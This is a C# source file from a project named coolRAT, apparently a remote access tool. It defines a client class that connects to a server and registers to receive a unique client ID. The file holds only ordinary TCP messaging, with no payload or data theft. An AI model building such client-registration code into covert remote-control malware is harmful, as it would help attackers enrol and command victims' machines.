using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;

namespace coolRAT.Libs.Connections
{
    /// <summary>
    /// Client Authorization Protocol client
    /// </summary>
    public class CAP_Client
    {
        public TcpConnection MainConnection;
        public TcpConnection IncomingConnection;
        public TcpConnection OutgoingConnection;
        public IPEndPoint ServerEndPoint;

        public CAP_Client(IPEndPoint serverEndPoint)
        {
            ServerEndPoint = serverEndPoint;
            MainConnection = new TcpConnection();
            IncomingConnection = new TcpConnection();
            OutgoingConnection = new TcpConnection();
        }

        public Guid RegisterClient()
        {
            if (!MainConnection.Connect(ServerEndPoint)) return Guid.Empty;
            CAP_RegisterClientPacket registerClientPacket = new CAP_RegisterClientPacket();
            MainConnection.WaitReadyMessage();
            MainConnection.SendPacket(registerClientPacket);
            MainConnection.SendReadyMessage();
            string packet_raw = MainConnection.ReceivePacket();
            Packet packet = Packet.Deserialize(packet_raw);
            if(packet.Type == "CAP_ClientRegisteredPacket")
            {
                CAP_ClientRegisteredPacket registeredPacket = CAP_ClientRegisteredPacket.Deserialize(packet_raw);
                MainConnection.Client.Close();
                return registeredPacket.UniqueClientId;
            }
            MainConnection.Client.Close();
            return Guid.NewGuid();
        }
    }
}
